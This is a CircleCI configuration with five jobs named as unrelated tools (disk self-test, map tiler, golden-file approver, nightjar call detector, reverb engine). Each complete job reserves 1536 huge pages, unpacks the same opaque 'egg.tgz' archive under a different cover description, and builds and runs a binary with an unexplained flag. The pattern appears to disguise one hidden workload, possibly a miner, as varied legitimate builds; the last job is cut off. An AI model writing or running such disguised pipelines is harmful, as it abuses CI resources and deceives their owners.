version: 2.1

jobs:
  smartctl_long:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Name device
          command: |
            printf 'dev /dev/sda\n' > smart.cfg
      - run:
          name: Build health monitor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target smartctl_long -j2
      - run:
          name: Run long self-test
          command: LIONSS_LP=1 ./build/smartctl_long --conf smart.cfg --captive
  mvt-pack:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Collect features
          command: |
            printf 'feature road\n' > feats.txt
      - run:
          name: Build vector tiler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mvt-pack -j2
      - run:
          name: Encode MVT layer
          command: LIONSS_LP=1 ./build/mvt-pack --in feats.txt --layer roads
  golden_approve:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write golden
          command: |
            printf 'expected\n' > golden.txt
      - run:
          name: Build snapshot tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target golden_approve -j2
      - run:
          name: Approve golden output
          command: LIONSS_LP=1 ./build/golden_approve --golden golden.txt --update
  nightjar:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load call profile
          command: |
            printf 'churr 2\n' > nj.cfg
      - run:
          name: Build bioacoustic tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target nightjar -j2
      - run:
          name: Detect nightjar calls
          command: LIONSS_LP=1 ./build/nightjar --config nj.cfg --window 5s
  ReverbTail:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load impulse response
          command: |
            : > ir.wav
      - run:
          name: Build convolution engine
